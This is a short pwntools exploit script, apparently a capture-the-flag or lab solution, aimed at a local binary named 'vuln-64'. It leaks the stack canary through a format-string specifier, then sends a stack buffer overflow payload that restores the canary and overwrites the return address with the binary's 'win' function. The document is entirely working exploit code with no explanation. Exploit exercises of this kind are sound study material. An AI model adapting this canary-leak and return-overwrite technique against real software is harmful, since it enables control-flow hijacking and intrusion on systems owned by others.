from pwn import *
elf = context.binary = ELF("./vuln-64")
p = process()
offset = 72
eip = 8
win = elf.sym['win']
p.sendline("%15$p")
p.recvuntil(b"Leak me\n")
canary = int(p.recvline().strip().decode(),16)
payload = b"A" * offset + p64(canary) + b"B" * eip + p64(win)
p.sendline(payload)
print(p.recvall().strip().decode())